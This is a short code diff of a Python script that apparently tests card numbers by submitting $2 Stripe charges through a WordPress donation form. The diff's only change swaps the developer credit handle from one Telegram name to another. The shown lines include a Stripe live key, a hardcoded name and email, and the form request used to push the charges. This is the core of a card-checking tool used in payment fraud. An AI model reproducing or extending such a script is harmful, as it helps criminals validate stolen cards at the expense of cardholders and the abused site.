@@ -7,7 +7,7 @@ import json
 from urllib.parse import urlparse
 
 # Developer info
-dev = "@diwazz"
+dev = "@mhitzxg"
 
 # Configuration - YOUR ORIGINAL CONFIG
 pkk = 'pk_live_51PvhEE07g9MK9dNZrYzbLv9pilyugsIQn0DocUZSpBWIIqUmbYavpiAj1iENvS7txtMT2gBnWVNvKk2FHul4yg1200ooq8sVnV'
@@ -368,7 +368,7 @@ def test_charge(cc_line):
                 f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce={fn}&'
                 f'_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&'
                 f'email=khatrieex%40gmail.com&custom-payment-amount=2&'
-                f'description=Telegrm%20%3A-%20%40diwazz&payment_method=stripe&'
+                f'description=Telegrm%20%3A-%20%40mhitzxg&payment_method=stripe&'
                 f'__stripe_payment_method_id={payment_method_id}'
             ),
             'action': 'fluentform_submit',
